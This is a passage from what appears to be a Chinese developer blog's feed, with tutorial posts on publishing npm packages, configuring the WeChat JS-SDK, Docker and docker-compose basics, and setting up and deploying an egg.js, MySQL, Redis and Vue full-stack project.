class="code"><pre><span class="line">npm <span class="built_in">logout</span></span><br></pre></td></tr></table></figure><blockquote><p>如果不知道当前登录的账号可以用who命令查看身份：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="built_in">who</span> am i</span><br></pre></td></tr></table></figure><blockquote><p>登录成功就可以将我们的包推送到服务器上去了，执行下面命令，会看到一堆的npm notice：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure><blockquote><p>如果某版本的包有问题，我们还可以将其撤回</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm unpublish [pkg]@[version]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sh </tag>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信js-sdk配置流程（测试号与公众号配置）</title>
      <link href="/2021/10/14/wx-jssdk/"/>
      <url>/2021/10/14/wx-jssdk/</url>
      
        <content type="html"><![CDATA[<h3 id="一、微信公号后台配置"><a href="#一、微信公号后台配置" class="headerlink" title="一、微信公号后台配置"></a>一、微信公号后台配置</h3><h4 id="1、获取-AppID、AppSecret"><a href="#1、获取-AppID、AppSecret" class="headerlink" title="1、获取 AppID、AppSecret"></a>1、获取 AppID、AppSecret</h4><blockquote><h5 id="测试号可从微信测试号申请获取-这样就获得了-AppID-与-AppSecret"><a href="#测试号可从微信测试号申请获取-这样就获得了-AppID-与-AppSecret" class="headerlink" title="测试号可从微信测试号申请获取,这样就获得了 AppID 与 AppSecret"></a><code>测试号</code>可从<a href="http://mp.weixin.qq.com/debug/cgi-bin/sandboxinfo?action=showinfo&t=sandbox/index">微信测试号申请</a>获取,这样就获得了 AppID 与 AppSecret</h5></blockquote><img width="40%" align="ceter" src="https://z3.ax1x.com/2021/10/14/5lMgQx.png" alt="ronaldoxzb" /></p><blockquote><h5 id="公众号申请自行操作申请完成后在公众号后台设置与开发基本配置中获取"><a href="#公众号申请自行操作申请完成后在公众号后台设置与开发基本配置中获取" class="headerlink" title="公众号申请自行操作申请完成后在公众号后台设置与开发基本配置中获取"></a><code>公众号申请自行操作</code>申请完成后在公众号后台<code>设置与开发</code>基本配置中获取</h5></blockquote><img width="40%" align="ceter" src="https://z3.ax1x.com/2021/10/20/5BJtIK.png" alt="ronaldoxzb" /><h4 id="2、配置-AppID、AppSecret"><a href="#2、配置-AppID、AppSecret" class="headerlink" title="2、配置 AppID、AppSecret"></a>2、配置 AppID、AppSecret</h4><blockquote><h5 id="获取到AppID、AppSecret后，可在程序中配置"><a href="#获取到AppID、AppSecret后，可在程序中配置" class="headerlink" title="获取到AppID、AppSecret后，可在程序中配置"></a><code>获取到AppID、AppSecret后，可在程序中配置</code></h5></blockquote><h4 id="3、IP-白名单添加（需要服务器-ip）"><a href="#3、IP-白名单添加（需要服务器-ip）" class="headerlink" title="3、IP 白名单添加（需要服务器 ip）"></a>3、IP 白名单添加（需要服务器 ip）</h4><blockquote><h5 id="添加IP白名单来调用获取ACCESS-TOKEN的接口"><a href="#添加IP白名单来调用获取ACCESS-TOKEN的接口" class="headerlink" title="添加IP白名单来调用获取ACCESS_TOKEN的接口"></a><code>添加IP白名单来调用获取ACCESS_TOKEN的接口</code></h5></blockquote><img width="40%" align="ceter" src="https://z3.ax1x.com/2021/10/20/5BYUwq.png" alt="ronaldoxzb" /><h4 id="4、配置服务器地址（与微信通信检查）"><a href="#4、配置服务器地址（与微信通信检查）" class="headerlink" title="4、配置服务器地址（与微信通信检查）"></a>4、配置服务器地址（与微信通信检查）</h4><blockquote><h5 id="程序中写好通信接口，配置好路由，可查看图片中标记"><a href="#程序中写好通信接口，配置好路由，可查看图片中标记" class="headerlink" title="程序中写好通信接口，配置好路由，可查看图片中标记"></a><code>程序中写好通信接口，配置好路由，可查看图片中标记</code></h5><h5 id="慎重操作下图中的启用-停用按钮，会把公众号配置好的菜单下架掉（点击停用后可重新找回）"><a href="#慎重操作下图中的启用-停用按钮，会把公众号配置好的菜单下架掉（点击停用后可重新找回）" class="headerlink" title="慎重操作下图中的启用/停用按钮，会把公众号配置好的菜单下架掉（点击停用后可重新找回）"></a><code>慎重操作下图中的启用/停用按钮，会把公众号配置好的菜单下架掉（点击停用后可重新找回）</code></h5></blockquote><img width="40%" align="ceter" src="https://z3.ax1x.com/2021/10/20/5BYYOs.png" alt="ronaldoxzb" /><h4 id="5、配置接口安全域名，成功调用-jssdk-（需要域名）"><a href="#5、配置接口安全域名，成功调用-jssdk-（需要域名）" class="headerlink" title="5、配置接口安全域名，成功调用 jssdk （需要域名）"></a>5、配置接口安全域名，成功调用 jssdk （需要域名）</h4><blockquote><h5 id="配置安全域名目录见下图"><a href="#配置安全域名目录见下图" class="headerlink" title="配置安全域名目录见下图"></a><code>配置安全域名目录见下图</code></h5></blockquote><img width="40%" align="ceter" src="https://z3.ax1x.com/2021/10/20/5BYNmn.png" alt="ronaldoxzb" /></p><blockquote><h5 id="配置域名前注意下图中的表述，上传文件至服务器，验证服务器是否是你本人所有，域名的合规性。"><a href="#配置域名前注意下图中的表述，上传文件至服务器，验证服务器是否是你本人所有，域名的合规性。" class="headerlink" title="配置域名前注意下图中的表述，上传文件至服务器，验证服务器是否是你本人所有，域名的合规性。"></a><code>配置域名前注意下图中的表述，上传文件至服务器，验证服务器是否是你本人所有，域名的合规性。</code></h5></blockquote><img width="40%" align="ceter" src="https://z3.ax1x.com/2021/10/20/5BYJyj.png" alt="ronaldoxzb" /><h4 id="到此配置流程已结束，之后会出一片代码配置文章。"><a href="#到此配置流程已结束，之后会出一片代码配置文章。" class="headerlink" title="到此配置流程已结束，之后会出一片代码配置文章。"></a>到此配置流程已结束，之后会出一片代码配置文章。</h4>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> wx-jssdk </tag>
            
            <tag> wx-config </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker相关</title>
      <link href="/2021/08/31/docker/"/>
      <url>/2021/08/31/docker/</url>
      
        <content type="html"><![CDATA[<p><img width="300" align="center" src="/images/dockerlogo.png" alt="ronaldoxzb" /></p></p><h3 id="一、集装箱？"><a href="#一、集装箱？" class="headerlink" title="一、集装箱？"></a>一、集装箱？</h3><p>来自于知乎的通俗解释：<br>Docker 的思想来自于 集装箱，集装箱解决了什么问题？在一艘大船上，可以把货物规整的摆放起来。并且各种各样的货物被集装箱标准化了，集装箱和集装箱之间不会互相影响。那么我就不需要专门运送水果的船和专门运送化学品的船了。只要这些货物在集装箱里封装的好好的，那我就可以用一艘大船把他们都运走。</p><h3 id="docker-核心概念"><a href="#docker-核心概念" class="headerlink" title="docker 核心概念"></a>docker 核心概念</h3><h4 id="镜像-image"><a href="#镜像-image" class="headerlink" title="镜像(image)"></a>镜像(image)</h4><p><code>类似于虚拟机中的镜像（image），是一个包含有文件系统的面向Docker引擎的只读模板。任何应用程序运行都需要环境，而镜像就是用来提供这种运行环境的。镜像可以用来创建 Docker 容器</code></p><h4 id="仓库-repository-node-js-镜像仓库"><a href="#仓库-repository-node-js-镜像仓库" class="headerlink" title="仓库(repository) node.js 镜像仓库"></a>仓库(repository) <a href="https://hub.docker.com/_/node">node.js 镜像仓库</a></h4><p><code>仓库（Repository）是集中存放镜像文件的场所。类似于代码仓库，这里是镜像仓库。</code></p><h4 id="容器-container"><a href="#容器-container" class="headerlink" title="容器(container)"></a>容器(container)</h4><p><code>Docker 利用容器（Container）来运行应用。容器是从镜像创建的运行实例。可以看作一个简易版的 Linux 环境</code></p><h4 id="对比记忆"><a href="#对比记忆" class="headerlink" title="对比记忆"></a>对比记忆</h4><blockquote><p>Java 号称“一次编译，到处运行”，因为 java 虚拟机解决平台的兼容性问题，所以有 java 虚拟机的地方就能跑 java 代码；</p></blockquote><blockquote><p>Docker 是：“一次封装，到处运行”，因为 docker 解决了应用环境的问题，安装了 docker 的平台就能跑“docker 包”，这样就决绝了“开发环境能跑，一上线就崩”的尴尬。</p></blockquote><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">images      List images</span><br><span class="line">ps          List containers</span><br><span class="line">pull        Pull an image or a repository from a registry</span><br><span class="line">push        Push an image or a repository to a registry</span><br><span class="line">rename      Rename a container</span><br><span class="line">restart     Restart one or more containers</span><br><span class="line"><span class="built_in">rm</span>          Remove one or more containers</span><br><span class="line">rmi         Remove one or more images</span><br><span class="line">run         Run a <span class="built_in">command</span> <span class="keyword">in</span> a new container</span><br></pre></td></tr></table></figure><h4 id="快速启动常用软件-有道云笔记"><a href="#快速启动常用软件-有道云笔记" class="headerlink" title="快速启动常用软件 有道云笔记"></a>快速启动常用软件 <a href="http://note.youdao.com/s/XQGk25P1">有道云笔记</a></h4><h3 id="二、Dockerfile"><a href="#二、Dockerfile" class="headerlink" title="二、Dockerfile"></a>二、Dockerfile</h3><h4 id="什么是-dockerfile"><a href="#什么是-dockerfile" class="headerlink" title="什么是 dockerfile?"></a>什么是 dockerfile?</h4><p><code>Dockerfile 是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。 Docker 通过读取Dockerfile中的指令自动生成映像。</code></p><p><code>docker build命令用于从 Dockerfile 构建映像。可以在docker build命令中使用-f标志指向文件系统中任何位置的 Dockerfile。</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -f /path/to/a/Dockerfile</span><br></pre></td></tr></table></figure><h4 id="Dockerfile-文件说明"><a href="#Dockerfile-文件说明" class="headerlink" title="Dockerfile 文件说明"></a>Dockerfile 文件说明</h4><p><code>Docker 以从上到下的顺序运行 Dockerfile 的指令。为了指定基本映像，第一条指令必须是 FROM。一个声明以＃字符开头则被视为注释。可以在 Docker 文件中使用RUN，CMD，FROM，EXPOSE，ENV等指令。</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># node镜像</span></span><br><span class="line">FROM node:12-alpine as build-stage</span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;-------------------- web环境配置 --------------------&quot;</span></span><br><span class="line"><span class="comment"># 指定接下来的工作路径为/app  - 类似于cd命令</span></span><br><span class="line">WORKDIR /app</span><br><span class="line"><span class="comment"># 拷贝前端项目到app目录下</span></span><br><span class="line">COPY ./web/package*.json ./</span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">RUN npm i --registry=https://registry.npm.taobao.org</span><br><span class="line">COPY ./web ./</span><br><span class="line"><span class="comment"># 打包 - 目的：丢到nginx下跑</span></span><br><span class="line">RUN npm run build:prod</span><br></pre></td></tr></table></figure><h3 id="三、Docker-Compose"><a href="#三、Docker-Compose" class="headerlink" title="三、Docker Compose"></a>三、Docker Compose</h3><h4 id="什么是-docker-compose"><a href="#什么是-docker-compose" class="headerlink" title="什么是 docker-compose?"></a>什么是 docker-compose?</h4><p><code>Docker-compose 是 docker 的服务编排工具，主要是用来构建多个服务，一般是构建构建多个有关联的服务。</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  mysql5.7:</span><br><span class="line">    image: mysql:5.7</span><br><span class="line">    container_name: mysql</span><br><span class="line">    volumes:</span><br><span class="line">      - <span class="string">&quot;./mysql5.7/data:/var/lib/mysql&quot;</span></span><br><span class="line">      - <span class="string">&quot;./mysql5.7/conf:/etc/mysql/conf.d&quot;</span></span><br><span class="line">      - ./docker/mysql/init:/docker-entrypoint-initdb.d/ <span class="comment">#执行默认脚本</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;3306:3306&quot;</span></span><br><span class="line">    user: root:root</span><br><span class="line">    <span class="built_in">tty</span>: <span class="literal">true</span></span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - PROCESS_NUM=1</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=xier0571</span><br><span class="line">      - TZ=Asia/Shanghai</span><br><span class="line">      - TIME_STYLE=<span class="string">&quot;+%F %T&quot;</span></span><br><span class="line">      - LANG=en_US.UTF-8</span><br><span class="line">  redis4:</span><br><span class="line">    image: redis:4</span><br><span class="line">    container_name: redis</span><br><span class="line">    volumes:</span><br><span class="line">      - <span class="string">&quot;./redis4/conf:/usr/local/etc/redis&quot;</span></span><br><span class="line">      - <span class="string">&quot;./redis4/data:/data&quot;</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;6379:6379&quot;</span></span><br><span class="line">    <span class="built_in">tty</span>: <span class="literal">true</span></span><br><span class="line">    restart: always</span><br><span class="line">    <span class="built_in">command</span>: redis-server --requirepass xier0571</span><br></pre></td></tr></table></figure><h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">up                 Create and start containers</span><br><span class="line">down               Stop and remove resources</span><br><span class="line">images             List images</span><br><span class="line">ps                 List containers</span><br><span class="line">top                Display the running processes</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Deploy-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>egg  + sequelize + mysql + jwt + vue 全栈项目部署</title>
      <link href="/2021/08/31/compose-deploy/"/>
      <url>/2021/08/31/compose-deploy/</url>
      
        <content type="html"><![CDATA[<h3 id="Egg-spider"><a href="#Egg-spider" class="headerlink" title="Egg-spider"></a>Egg-spider</h3><h4 id="后端-egg-js-jwt-mysql-sequelize-redis-docker-docker-compose-nginx-vue-element-ui-全栈获取省市区数据（统计局数据）【工具】项目，实现在docker环境中一键部署"><a href="#后端-egg-js-jwt-mysql-sequelize-redis-docker-docker-compose-nginx-vue-element-ui-全栈获取省市区数据（统计局数据）【工具】项目，实现在docker环境中一键部署" class="headerlink" title="[后端]egg.js(jwt) + mysql(sequelize) + redis + docker + docker-compose + nginx + vue + element-ui 全栈获取省市区数据（统计局数据）【工具】项目，实现在docker环境中一键部署"></a>[后端]egg.js(jwt) + mysql(sequelize) + redis + docker + docker-compose + nginx + vue + element-ui 全栈获取省市区数据（统计局数据）【工具】项目，实现在docker环境中一键部署</h4><h5 id="1-实现用户注册登录"><a href="#1-实现用户注册登录" class="headerlink" title="1 实现用户注册登录"></a>1 实现用户注册登录</h5><h5 id="2-实现统计局省市区数据的爬取"><a href="#2-实现统计局省市区数据的爬取" class="headerlink" title="2 实现统计局省市区数据的爬取"></a>2 实现统计局省市区数据的爬取</h5><h5 id="3-实现大批量excel测试数据"><a href="#3-实现大批量excel测试数据" class="headerlink" title="3 实现大批量excel测试数据"></a>3 实现大批量excel测试数据</h5><h5 id="4-实现资源的监控"><a href="#4-实现资源的监控" class="headerlink" title="4 实现资源的监控"></a>4 实现资源的监控</h5><h5 id="5-实现羽雀API的调用"><a href="#5-实现羽雀API的调用" class="headerlink" title="5 实现羽雀API的调用"></a>5 实现羽雀API的调用</h5><h5 id="6-实现邮件的发送（基于smtp-qq-com"><a href="#6-实现邮件的发送（基于smtp-qq-com" class="headerlink" title="6 实现邮件的发送（基于smtp.qq.com)"></a>6 实现邮件的发送（基于smtp.qq.com)</h5><h4 id="前端-element-ui-https-github-com-PanJiaChen-vue-admin-template-🙏"><a href="#前端-element-ui-https-github-com-PanJiaChen-vue-admin-template-🙏" class="headerlink" title="[前端] element-ui (https://github.com/PanJiaChen/vue-admin-template) 🙏"></a>[前端] element-ui (<a href="https://github.com/PanJiaChen/vue-admin-template">https://github.com/PanJiaChen/vue-admin-template</a>) 🙏</h4><h5 id="PanJiaChen-大佬最精简的一副vue模版（拿来熟悉docker-compose的发布流程）"><a href="#PanJiaChen-大佬最精简的一副vue模版（拿来熟悉docker-compose的发布流程）" class="headerlink" title="PanJiaChen 大佬最精简的一副vue模版（拿来熟悉docker-compose的发布流程）"></a>PanJiaChen 大佬最精简的一副vue模版（拿来熟悉docker-compose的发布流程）</h5><h3 id="Project-back-end-structure-description"><a href="#Project-back-end-structure-description" class="headerlink" title="Project back end structure description"></a>Project back end structure description</h3><h4 id="app"><a href="#app" class="headerlink" title="app"></a>app</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">├── contract</span><br><span class="line">│   └── type.js     swaggerdoc配置文件</span><br><span class="line">├── controller</span><br><span class="line">│   ├── api</span><br><span class="line">│   │   ├── area.js     省市区乡镇村数据获取</span><br><span class="line">│   │   ├── mock.js     生成mock数据生成Excel文件</span><br><span class="line">│   │   ├── system.js       获取系统资源使用情况</span><br><span class="line">│   │   ├── tool</span><br><span class="line">│   │   │   └── email.js        发送邮件</span><br><span class="line">│   │   ├── user.js</span><br><span class="line">│   │   └── yuque.js        羽雀API调用</span><br><span class="line">│   └── view</span><br><span class="line">│       └── page.js     模版引擎渲染index</span><br><span class="line">├── database</span><br><span class="line">│   └── db.js       model层公用</span><br><span class="line">├── extend</span><br><span class="line">│   ├── application.js      app扩展函数</span><br><span class="line">│   └── helper.js       公用函数封装</span><br><span class="line">├── middleware</span><br><span class="line">│   ├── error_handler.js    成功/出错处理等</span><br><span class="line">│   ├── notfound_handler.js     404处理等</span><br><span class="line">│   └── pagination.js       分页器封装</span><br><span class="line">├── model</span><br><span class="line">│   ├── cities.js       市表</span><br><span class="line">│   ├── districts.js        街道表</span><br><span class="line">│   ├── provinces.js        省表</span><br><span class="line">│   ├── towns.js        乡镇表</span><br><span class="line">│   ├── user.js     用户表</span><br><span class="line">│   └── villages.js     村表</span><br><span class="line">├── public      静态资源文件</span><br><span class="line">├── router      路由表（不赘述）</span><br><span class="line">│   ├── api</span><br><span class="line">│   │   ├── area.js     </span><br><span class="line">│   │   ├── mock.js</span><br><span class="line">│   │   ├── system.js</span><br><span class="line">│   │   ├── tool</span><br><span class="line">│   │   │   └── email.js</span><br><span class="line">│   │   ├── user.js</span><br><span class="line">│   │   └── yuque.js</span><br><span class="line">│   └── view</span><br><span class="line">│       └── page.js</span><br><span class="line">├── service     逻辑处理层</span><br><span class="line">│   ├── area.js     </span><br><span class="line">│   ├── cache.js</span><br><span class="line">│   ├── common.js</span><br><span class="line">│   └── user.js</span><br><span class="line">├── utils       暂无</span><br><span class="line">└── view        未做前后端分离前的模版引擎渲染的页面</span><br><span class="line">    ├── index.html</span><br><span class="line">    └── tool.html</span><br></pre></td></tr></table></figure><h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">├── config.default.js   默认配置文件</span><br><span class="line">├── config.local.js     本地开发配置文件</span><br><span class="line">├── config.prod.js      生产配置文件</span><br><span class="line">└── plugin.js       插件配置文件</span><br></pre></td></tr></table></figure><h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">├── mysql</span><br><span class="line">│   ├── Dockerfile      mysql镜像文件</span><br><span class="line">│   ├── init</span><br><span class="line">│   │   └── init.sql        初始建库执行的sql   </span><br><span class="line">│   └── mysqld.cnf      mysql配置文件</span><br><span class="line">├── redis</span><br><span class="line">│   ├── Dockerfile      redis镜像文件</span><br><span class="line">│   └── redis.conf      redis配置文件</span><br><span class="line">├── server</span><br><span class="line">│   └── Dockerfile      server镜像文件启动</span><br><span class="line">└── web</span><br><span class="line">    ├── Dockerfile      web build 及 nginx镜像文件</span><br><span class="line">    └── nginx.conf      nginx配置文件</span><br></pre></td></tr></table></figure><h3 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h3><h4 id="server-自行安装docker-amp-docker-compose-amp-amp-node"><a href="#server-自行安装docker-amp-docker-compose-amp-amp-node" class="headerlink" title="server(自行安装docker&amp;docker-compose&amp;&amp;node)"></a><code>server(自行安装docker&amp;docker-compose&amp;&amp;node)</code></h4><h5 id="start-mysql-amp-redis"><a href="#start-mysql-amp-redis" class="headerlink" title="start mysql &amp; redis"></a>start mysql &amp; redis</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose -f docker-compose-dev.yml up     </span><br></pre></td></tr></table></figure><h5 id="start-server"><a href="#start-server" class="headerlink" title="start server"></a>start server</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ npm i</span><br><span class="line">$ npm run dev</span><br><span class="line">$ open http://localhost:7001/</span><br></pre></td></tr></table></figure><h4 id="web-自行安装node环境"><a href="#web-自行安装node环境" class="headerlink" title="web(自行安装node环境)"></a><code>web(自行安装node环境)</code></h4><h5 id="start-web"><a href="#start-web" class="headerlink" title="start web"></a>start web</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ npm i</span><br><span class="line">$ npm run dev</span><br><span class="line">$ open http://localhost:9028/</span><br></pre></td></tr></table></figure><h3 id="Deploy-宿主机安装docker-amp-amp-docker-compose"><a href="#Deploy-宿主机安装docker-amp-amp-docker-compose" class="headerlink" title="Deploy(宿主机安装docker&amp;&amp;docker-compose)"></a>Deploy(宿主机安装docker&amp;&amp;docker-compose)</h3><!-- start stop --><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose up</span><br><span class="line">$ docker-compose stop</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Deploy-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> egg </tag>
            
            <tag> vue </tag>
            
            <tag> nginx </tag>
            
            <tag> docker </tag>
            
            <tag> docker-compose </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>egg  + sequelize + mysql + jwt + vue 实现全栈服务（一）</title>
      <link href="/2021/08/26/egg-01/"/>
      <url>/2021/08/26/egg-01/</url>
      
        <content type="html"><![CDATA[<h1 id="Egg-js的常用配置"><a href="#Egg-js的常用配置" class="headerlink" title="Egg.js的常用配置"></a>Egg.js的常用配置</h1><h3 id="一、egg-js常用配置（在config目录下根据不同环境配置-config-default-或config-prod-js）"><a href="#一、egg-js常用配置（在config目录下根据不同环境配置-config-default-或config-prod-js）" class="headerlink" title="一、egg.js常用配置（在config目录下根据不同环境配置 config.default.或config.prod.js）"></a>一、egg.js常用配置（在config目录下根据不同环境配置 <em>config.default.或config.prod.js</em>）</h3><h4 id="1-数据库链接配置"><a href="#1-数据库链接配置" class="headerlink" title="1:数据库链接配置"></a>1:数据库链接配置</h4><pre><code>// mysql config  config.dbConfig = &#123;    database: process.env.DB_DATABASE || &#39;user&#39;,    host: process.env.DB_HOST || &#39;124.70.215.***&#39;,    port: process.env.DB_PORT || &#39;3306&#39;,    username: process.env.DB_USER || &#39;root&#39;,    password: process.env.DB_PASSWORD || &#39;******&#39;,    charset: &#39;utf8mb4&#39;,    collate: &#39;utf8_general_ci&#39;  &#125;</code></pre><h4 id="2-jwt配置"><a href="#2-jwt配置" class="headerlink" title="2:jwt配置"></a>2:jwt配置</h4><pre><code>// jwt 配置  config.jwt = &#123;    secret: &#39;zzestlgcjwtsecret&#39;,    getToken(ctx) &#123;      if (        ctx.headers.authorization &amp;&amp;        (ctx.headers.authorization.split(&#39; &#39;)[0] === &#39;Bearer&#39; ||          ctx.headers.authorization.split(&#39; &#39;)[0] === &#39;Token&#39;)      ) &#123;        return ctx.headers.authorization.split(&#39; &#39;)[1]      &#125; else if (ctx.query &amp;&amp; ctx.query.token) &#123;        return ctx.query.token      &#125;      return null    &#125;  &#125;</code></pre><h4 id="3-跨域配置"><a href="#3-跨域配置" class="headerlink" title="3:跨域配置"></a>3:跨域配置</h4><pre><code>// 跨域配置  config.cors = &#123;    origin: &#39;*&#39;,    allowMethods: &#39;GET, HEAD, PUT, POST, DELETE, PATCH, OPTIONS&#39;  &#125;</code></pre><h4 id="4-部署指定端口配置"><a href="#4-部署指定端口配置" class="headerlink" title="4:部署指定端口配置"></a>4:部署指定端口配置</h4><pre><code>// 指定端口启动config.cluster = &#123;    listen: &#123;      path: &#39;&#39;,      port: 3005,      hostname: &#39;0.0.0.0&#39;,    &#125;  &#125;;</code></pre><h4 id="5-常用插件的配置"><a href="#5-常用插件的配置" class="headerlink" title="5:常用插件的配置"></a>5:常用插件的配置</h4><pre><code>    // Sequelize插件  sequelize: &#123;    enable: true,    package: &#39;egg-sequelize&#39;  &#125;,  // 校验插件  validate: &#123;    enable: true,    package: &#39;egg-validate&#39;  &#125;,  // jwt插件  jwt: &#123;    enable: true,    package: &#39;egg-jwt&#39;  &#125;,  // 子路由  routerPlus: &#123;    enable: true,    package: &#39;egg-router-plus&#39;  &#125;,  // 跨域  cors: &#123;    enable: true,    package: &#39;egg-cors&#39;  &#125;,</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egg-scripts start --daemon 启动于 egg-bin dev 的区别在于前者是在后台运行</span><br></pre></td></tr></table></figure><h5 id="注意项目在dev环境启动的时候要注意package-json中所对应的指令。"><a href="#注意项目在dev环境启动的时候要注意package-json中所对应的指令。" class="headerlink" title="注意项目在dev环境启动的时候要注意package.json中所对应的指令。"></a>注意项目在dev环境启动的时候要注意package.json中所对应的指令。</h5><h5 id="由于框架的配置功能比较强大，有不同环境变量，又有框架、插件、应用等很多地方配置，如果配置不生效时可以查看下-root-run-application-config-json（worker-进程配置）-和-root-run-agent-config-json（agent-进程配置）-这两个文件。"><a href="#由于框架的配置功能比较强大，有不同环境变量，又有框架、插件、应用等很多地方配置，如果配置不生效时可以查看下-root-run-application-config-json（worker-进程配置）-和-root-run-agent-config-json（agent-进程配置）-这两个文件。" class="headerlink" title="由于框架的配置功能比较强大，有不同环境变量，又有框架、插件、应用等很多地方配置，如果配置不生效时可以查看下 ${root}/run/application_config.json（worker 进程配置） 和 ${root}/run/agent_config.json（agent 进程配置） 这两个文件。"></a>由于框架的配置功能比较强大，有不同环境变量，又有框架、插件、应用等很多地方配置，如果配置不生效时可以查看下 ${root}/run/application_config.json（worker 进程配置） 和 ${root}/run/agent_config.json（agent 进程配置） 这两个文件。</h5>]]></content>
      
      
      <categories>
          
          <category> BackEnd-Tec </category>
          
      </categories>
      
      
